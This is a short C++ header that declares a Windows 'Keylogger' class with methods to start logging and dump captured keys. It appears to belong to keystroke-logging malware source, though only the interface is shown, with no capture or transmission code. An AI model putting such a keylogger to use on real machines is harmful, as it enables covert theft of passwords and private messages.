#pragma once
#include "settings.h"
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <string>
#include <thread>

class Keylogger
{
public:
	static void StartLogger();
	static std::string DumpKeys();
private:
	static void Logger();
	static std::string intToString(int i);
};

